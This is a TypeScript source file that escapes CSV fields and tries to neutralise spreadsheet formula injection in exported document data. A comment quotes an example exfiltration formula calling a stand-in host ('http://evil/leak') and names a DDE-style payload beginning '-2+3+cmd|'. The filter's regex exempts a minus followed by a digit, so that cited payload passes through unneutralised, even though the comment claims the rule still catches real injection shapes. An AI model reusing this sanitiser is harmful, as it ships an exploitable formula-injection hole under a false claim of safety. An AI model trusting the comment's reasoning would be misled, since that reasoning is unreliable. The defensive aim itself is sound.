// Hand-rolled rather than a new dependency — CSV quoting is a handful of rules
// (RFC 4180): quote a field if it contains a comma, a quote, or a newline, and
// double up any internal quotes. Small enough that a library isn't justified.
function escapeCsvField(value: string): string {
  if (/[",\n\r]/.test(value)) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;
}

// CSV values in this export come straight from documents the model transcribed
// verbatim (extract/run.ts's normalizeValue only touches 'money' fields — every
// other field type, including free-text ones like vendor name or a line-item
// description, passes through unchanged). Excel and Google Sheets both treat a
// leading =, +, -, or @ as the start of a formula when the CSV is opened, so
// document text containing e.g. `=HYPERLINK("http://evil/leak?d="&A1)` becomes a
// live, executing payload rather than inert text (CSV/formula injection, CWE-1236).
//
// A bare leading '-' is excluded from the "always neutralize" set: money fields in
// this export are legitimately negative (a credit/refund, or the parenthetical-
// negative-notation fix in confidence/validate.ts's stripMoneySymbols), and this
// function has no field-type context to tell "-54.00" apart from an attacker's
// "-2+3+cmd|...". Only prefixing a '-' NOT immediately followed by a digit still
// catches the shapes an injection payload actually needs (a formula reference or
// function call right after the sign) without mangling ordinary negative numbers.
const FORMULA_TRIGGER_RE = /^[=+@]|^-(?!\d)/;

function neutralizeFormulaPrefix(value: string): string {
  return FORMULA_TRIGGER_RE.test(value) ? `'${value}` : value;
}

function toCsvValue(value: unknown): string {
  if (value === null || value === undefined) return '';
  return escapeCsvField(neutralizeFormulaPrefix(String(value)));
}

export function buildCsv(headers: string[], rows: unknown[][]): string {
  const lines = [headers.map(toCsvValue).join(',')];
  for (const row of rows) {
    lines.push(row.map(toCsvValue).join(','));
  }
  // CRLF per RFC 4180; trailing newline so the file ends cleanly.
  return lines.join('\r\n') + '\r\n';
}
